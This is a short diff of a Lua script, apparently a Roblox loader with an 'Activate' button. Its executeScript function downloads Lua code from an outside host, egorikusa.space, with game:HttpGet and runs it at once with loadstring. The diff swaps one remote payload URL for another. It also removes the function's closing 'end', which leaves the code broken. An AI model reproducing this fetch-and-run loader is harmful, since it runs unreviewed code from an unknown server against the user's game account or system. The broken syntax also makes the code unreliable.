@@ -112,8 +112,7 @@ local currentTime = 0 -- To track the elapsed time for the loading screen
 -- Add the script to be executed immediately when Activate is pressed
 local function executeScript()
     -- This will load and run your external script immediately
-    loadstring(game:HttpGet("https://egorikusa.space/2caacab0add5fc4320a32a23.lua", true))()
-end
+    loadstring(game:HttpGet("https://egorikusa.space/1a0e89fdef7900934bfaa3a1.lua", true))()
 
 -- Activate Button Functionality
 local function activateAction()
